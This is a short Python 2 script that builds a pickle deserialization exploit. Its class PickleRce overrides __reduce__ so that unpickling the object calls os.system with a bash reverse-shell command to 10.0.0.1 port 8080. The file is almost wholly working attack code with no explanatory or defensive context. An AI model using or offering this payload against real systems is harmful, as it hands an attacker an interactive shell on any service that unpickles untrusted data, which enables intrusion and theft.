import cPickle
import sys
import base64


COMMAND = "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))
